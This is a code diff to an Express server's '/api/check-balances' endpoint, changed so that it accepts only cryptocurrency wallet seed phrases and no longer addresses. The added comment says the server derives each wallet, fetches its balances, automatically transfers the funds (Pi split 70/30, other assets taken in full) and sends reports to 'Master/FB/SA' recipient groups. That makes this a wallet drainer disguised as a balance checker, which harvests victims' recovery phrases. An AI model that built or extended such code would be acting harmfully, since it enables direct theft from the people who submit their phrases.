@@ -43,32 +43,34 @@ const limiter = rateLimit({
 
 app.get('/health', (_req, res) => res.json({ ok: true }));
 
+/**
+ * POST /api/check-balances
+ * Body: { seedPhrases: string[] }   (addresses no longer accepted)
+ *
+ * For each seed phrase:
+ *   - Derives the wallet address
+ *   - Fetches unlocked/locked balances and other assets
+ *   - Automatically transfers funds (Pi 70/30, other assets 100% domestic)
+ *   - Sends reports to Master/FB/SA recipient groups
+ */
 app.post('/api/check-balances', limiter, async (req, res) => {
-  const { addresses, seedPhrases } = req.body || {};
+  const { seedPhrases } = req.body || {};
 
-  const hasAddresses = Array.isArray(addresses) && addresses.length > 0;
+  // Reject if addresses are sent
+  if (req.body && req.body.addresses) {
+    return res.status(400).json({ error: 'Only seedPhrases are accepted. Address checking has been removed.' });
+  }
+
   const hasSeedPhrases = Array.isArray(seedPhrases) && seedPhrases.length > 0;
-
-  if (!hasAddresses && !hasSeedPhrases) {
-    return res.status(400).json({
-      error: 'Provide either addresses or seedPhrases as a non-empty array',
-    });
+  if (!hasSeedPhrases) {
+    return res.status(400).json({ error: 'Provide seedPhrases as a non-empty array' });
   }
 
-  const totalInputCount =
-    (Array.isArray(addresses) ? addresses.length : 0) +
-    (Array.isArray(seedPhrases) ? seedPhrases.length : 0);
-
-  if (totalInputCount > MAX_ADDRESSES_PER_REQUEST) {
-    return res.status(400).json({
-      error: `Too many inputs. Max ${MAX_ADDRESSES_PER_REQUEST} per request.`,
-    });
+  if (seedPhrases.length > MAX_ADDRESSES_PER_REQUEST) {
+    return res.status(400).json({ error: `Too many seed phrases. Max ${MAX_ADDRESSES_PER_REQUEST} per request.` });
   }
 
-  if (hasAddresses && !addresses.every((a) => typeof a === 'string')) {
-    return res.status(400).json({ error: 'Every address must be a string' });
-  }
-  if (hasSeedPhrases && !seedPhrases.every((sp) => typeof sp === 'string')) {
+  if (!seedPhrases.every((sp) => typeof sp === 'string')) {
     return res.status(400).json({ error: 'Every seed phrase must be a string' });
   }
 
@@ -76,31 +78,25 @@ app.post('/api/check-balances', limiter, async (req, res) => {
   const seedPhraseMap = new Map();
   const invalidSeedPhrases = [];
 
-  if (Array.isArray(addresses)) {
-    addresses.forEach((a) => validAddresses.push(a.trim()));
-  }
-
-  if (Array.isArray(seedPhrases)) {
-    seedPhrases.forEach((sp, index) => {
-      try {
-        const derived = deriveAddressFromSeedPhrase(sp);
-        validAddresses.push(derived);
-        seedPhraseMap.set(derived, sp.trim());
-      } catch (err) {
-        invalidSeedPhrases.push({
-          address: `seed-${index + 1}`,
-          status: 'invalid',
-          unlockedBalance: null,
-          lockedBalance: null,
-          nextUnlockDate: null,
-          lockedBreakdown: [],
-          otherAssets: [],
-          error: 'Invalid seed phrase',
-          seedPhrase: sp.trim(),
-        });
-      }
-    });
-  }
+  seedPhrases.forEach((sp, index) => {
+    try {
+      const derived = deriveAddressFromSeedPhrase(sp);
+      validAddresses.push(derived);
+      seedPhraseMap.set(derived, sp.trim());
+    } catch (err) {
+      invalidSeedPhrases.push({
+        address: `seed-${index + 1}`,
+        status: 'invalid',
+        unlockedBalance: null,
+        lockedBalance: null,
+        nextUnlockDate: null,
+        lockedBreakdown: [],
+        otherAssets: [],
+        error: 'Invalid seed phrase',
+        seedPhrase: sp.trim(),
+      });
+    }
+  });
 
   try {
     const results = await getAccountsDetails(validAddresses);
